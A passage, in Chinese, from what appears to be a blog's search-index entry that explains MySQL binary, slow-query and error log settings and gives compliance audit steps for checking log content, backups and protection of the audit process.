-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_bin = LOG_NAME：         　　             （只读变量）只能通过修改配置文件来指定是否启用二进制日志（全局的）　　　　　#my.cnf配置文件中没有log_bin的配置，表示未开启二进制日志，如果存在log_bin的配置，则表示开启了二进制日志，同时，二进制日志文件的名称将会以log_bin对应的值为文件名前缀，文件默认位置在/var/lib/mysql/下，二进制日志文件的后缀名会进行自动编号，每次日志滚动后，后缀名编号自动加1.</span><br><span class="line">log_bin_basename = /var/lib/mysql/mysql-bin： 指定二进制日志的文件的基名</span><br><span class="line">log_bin_index = /var/lib/mysql/mysql-bin.index：指定二进制日志文件的索引文件</span><br><span class="line">binlog_format = STATEMENT|ROW|MIXED：      　 指定基于哪种方式进行记录　　　　　　　　　　STATEMENT:　　　　　　　　　  　基于“语句”记录　　　　　　　　　　ROW:　　　　　　　　　　　　   　基于“行”记录　　　　　　　　　　MIXED:　　　　　　　　　　　　　 让系统自行判定该基于哪种方式记录sync_binlog = 1|0：                           设定是否启动二进制日志同步功能</span><br><span class="line">             --&gt;每次提交事务，会将缓存中的内存刷新到二进制日志文件中。</span><br><span class="line">             --&gt;默认每个sql语句是一个事务，而且默认事务会自动提交，所以，默认的性能很差　　　　　　　　--&gt;此值为0时，表示当事务提交后，不会立即将内存中的binlog刷新到磁盘中；安全性最差，性能最高　　　　　　　　--&gt;此值为1时，表示每一次事务提交后，都会立即将内存中的二进制文件同步到磁盘中；安全性最高，性能最差　　　　　　　　--&gt;还能设置为N，当设置为3时，表示每3次事务提交后，将binlog从内存刷写到磁盘一次，值设置的越大，有可能丢失的日志数据越多，但性能会越好max_binlog_size = SIZE：                     指定二进制日志文件的上限，超过上限会滚动，以字节为单位（默认为1G，为1073741824B）</span><br><span class="line">max_binlog_cache_size = SIZE：               指定二进制日志缓存空间大小，空间被填满，会自动滚动</span><br><span class="line">sql_log_off = on|off：                       是否将一般的查询操作记录到二进制日志中</span><br><span class="line">sql_log_bin = ON |OFF：                     　指定是否启用二进制日志（会话级别）</span><br><span class="line">log_bin_trust_function_creators = on|off：  　指定是否允许创建可能导致不安全的函数</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>慢查询日志</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141622984.png" alt="image-20220714162252905"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 slow_query_log = OFF|ON  （0|1）　　　　　　#开启慢查询日志</span><br><span class="line">2 slow_query_log_file = LOCALHOST-SLOW.log #慢查询日志的文件路径</span><br><span class="line">3 long_query_time  　　　　　　　　　　　　　　 #慢查询时长；默认是10s</span><br><span class="line">4 log_slow_rate_limit　　　　　　　　　　　　　 #如果要记录的慢查询日志非常多的话，会按照速率来记录，默认1秒记录一个</span><br><span class="line">5 log_slow_verbosity=full | query_plan　　　 #记录的详细级别</span><br><span class="line">6 log_output 　　　　　　　　　　　　　　　　　　 #指定将记录到的查询保存到什么位置</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>错误日志</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_error%&#x27;</span>;</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_warnings%&#x27;</span>;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141623108.png" alt="image-20220714162314055"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 log_error = /var/log/mysql_error.log　　#指定错误日志的输出位置</span><br><span class="line">2 log_warnings 为0， 表示不记录告警信息。</span><br><span class="line">3 log_warnings 为1， 表示告警信息写入错误日志。</span><br><span class="line">4 log_warnings 大于1， 表示各类告警信息，例如有关网络故障的信息和重新连接信息写入错误日志。(默认为2)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>操作日志</strong></p>
-</li>
-</ul>
-<h2 id="审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"><a href="#审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息" class="headerlink" title="审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息"></a>审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息</h2><h3 id="执行下列语句"><a href="#执行下列语句" class="headerlink" title="执行下列语句:"></a>执行下列语句:</h3><p>mysql&gt;show master status;查看当前日志<br>根据日志存放路径，查看输出的日志内容</p>
-<h3 id="核查是否采取第三方工具增强MySQL日志功能。"><a href="#核查是否采取第三方工具增强MySQL日志功能。" class="headerlink" title="核查是否采取第三方工具增强MySQL日志功能。"></a>核查是否采取第三方工具增强MySQL日志功能。</h3><p>若有，记录第三方审计工具的审计内容，查看是否包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息<br>注；只要开启了审计功能，此项默认符合</p>
-<h2 id="应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"><a href="#应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等" class="headerlink" title="应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等"></a>应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等</h2><p>询问管理员</p>
-<h2 id="应对审计进程进行保护，防止未经授权的中断"><a href="#应对审计进程进行保护，防止未经授权的中断" class="headerlink" title="应对审计进程进行保护，防止未经授权的中断"></a>应对审计进程进行保护，防止未经授权的中断</h2><p>切换开放状态的账户（非root账户）进行测试，看能否中断审计、日志服务：</p>
-]]></content>
-      <categories>
-        <category>等级保护</category>
-      </categories>
-      <tags>
-        <tag>Mysql</tag>
-        <tag>等级保护</tag>
       </tags>
   </entry>
 </search>
